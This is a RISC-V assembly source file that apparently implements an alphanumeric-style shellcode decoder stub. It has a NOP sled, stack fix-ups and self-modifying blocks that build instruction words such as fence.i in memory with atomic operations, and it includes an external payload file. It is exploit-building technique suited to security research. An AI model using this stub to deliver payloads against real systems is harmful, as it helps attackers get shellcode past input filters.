/*#
 *# (c) 2018-2019 Hadrien Barral
 *# SPDX-License-Identifier: Apache-2.0
 */

.macro dangerous_nop2
 li t1,-2
.endm
.macro xp_fixup
    # n464:0 n448:26
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
.endm
.macro end_nopsled
    # len:8
    dangerous_nop2
    dangerous_nop2
    dangerous_nop2
    dangerous_nop2
    dangerous_nop2
    dangerous_nop2
    dangerous_nop2
    dangerous_nop2
.endm
step0:
    dangerous_nop2
    dangerous_nop2
    .word 0x2F302F6F
load_values:
    .dword 0x4A33304242424242
    .dword 0x4242424242424242
    .dword 0x4A43504242424242
payload_pool:
    .include PAYLOAD_FILE
step1:
    sra s2, zero, s3
    sra sp, t5, s2
step2:
    ld s4, 16(sp)
    amoand.d a6, s4, (sp)
    amoand.d a6, s4, (sp)
    li s4, 12
    sra tp, a6, s4
    sra s4, zero, s3
    amoand.d.rl zero, s4, (sp)
    amoor.d.aq a6, tp, (sp)
    amoand.w t5, s4, (sp)
    amoor.d tp, s4, (sp)
step3:
    xp_fixup
step4:
.macro init_block
    sra s4, zero, s3
    amoand.d.rl zero, s4, (sp)
    amoor.d.aq  a6, tp, (sp)
.endm
.macro next_block
    .short 0x6141
.endm
    init_block
    # Loading fenci
    lui     a0,0x412f3
    li      s4,18
    sra     t1,a0,s4
    addiw   t1,t1,-20
    addiw   t1,t1,-20
    addiw   t1,t1,-20
    amoor.w.aq t5,t1,(sp)
    next_block
    init_block
    # Loading 0x777d
    lui a0,0x57783
    li  s4,12
    sra t1,a0,s4
    addiw   t1,t1,-6
    amoor.w.aq t5,t1,(sp)
    next_block
    init_block
    # Loading 0x970a
    lui a0,0x59714
    li  s4,12
    sra t1,a0,s4
    addiw   t1,t1,-10
    amoor.w.aq t5,t1,(sp)
    next_block
    init_block
    # Loading 0x45c1
    lui a0,0x51704
    li  s4,14
    sra s4,a0,s4
    amoor.w    t5,s4,(sp)
    next_block
    init_block
    # Loading 0x59a
    lui a0,0x41673
    li  s4,14
    sra t1,a0,s4
    addiw   t1,t1,-2
    amoor.w.aq t5,t1,(sp)
    next_block
    init_block
    # Loading 0x853a
    lui a0,0x58544
    li  s4,12
    sra t1,a0,s4
    addiw   t1,t1,-10
    amoor.w.aq t5,t1,(sp)
    next_block
    init_block
    # Loading 0x86ba
    lui a0,0x586c4
    li  s4,12
    sra t1,a0,s4
    addiw   t1,t1,-10
    amoor.w.aq t5,t1,(sp)
    next_block
    init_block
    # Loading 0x4140
    lui a0,0x50503
    li  s4,14
    sra s4,a0,s4
    amoor.w    t5,s4,(sp)
    next_block
    init_block
    # Loading 0x87a2
    lui t5,0x587a2
    li  s2,12
    sra s4,t5,s2
    amoor.w    t5,s4,(sp)
    next_block
    init_block
    # Loading 0x8391
    lui a0,0x30723
    li  s4,13
    sra s4,a0,s4
    amoor.w    t5,s4,(sp)
    next_block
    init_block
    # Loading 0x509
    lui a0,0x41424
    li  s4,14
    sra s4,a0,s4
    amoor.w    t5,s4,(sp)
    next_block
    init_block
    # Loading 0x8c3d
    lui t5,0x2f462
    li  s2,12
    addiw   s2,s2,-5
    sra t1,t5,s2
    addiw   t1,t1,-3
    amoor.w.aq t5,t1,(sp)
    next_block
    init_block
    # Loading 0xc300
    lui a0,0x38614
    li  s4,13
    sra t1,a0,s4
    addiw   t1,t1,-10
    amoor.w.aq t5,t1,(sp)
    next_block
    init_block
    # Loading 0x705
    lui a0,0x50705
    li  s4,12
    sra s4,a0,s4
    amoor.w    t5,s4,(sp)
    next_block
    init_block
    # Loading 0x15f9
    lui a0,0x51613
    li  s4,12
    sra t1,a0,s4
    addiw   t1,t1,-10
    addiw   t1,t1,-16
    amoor.w.aq t5,t1,(sp)
    next_block
    init_block
    # Loading 0xf1c1
    lui t5,0x2f2f2
    li  s2,12
    addiw   s2,s2,-8
    sra t1,t5,s2
    addiw   t1,t1,-10
    addiw   t1,t1,-13
    addiw   t1,t1,-20
    addiw   t1,t1,-20
    amoor.w.aq t5,t1,(sp)
    next_block
    init_block
    # Loading fenci
    lui     a0,0x412f3
    li      s4,18
    sra     t1,a0,s4
    addiw   t1,t1,-20
    addiw   t1,t1,-20
    addiw   t1,t1,-20
    amoor.w.aq t5,t1,(sp)
    next_block
    init_block
    # Loading 0x9682
    lui t5,0x39682
    li  s2,12
    sra s4,t5,s2
    amoor.w    t5,s4,(sp)
    next_block
step5:
    end_nopsled
step6:
    csrc mip,sp
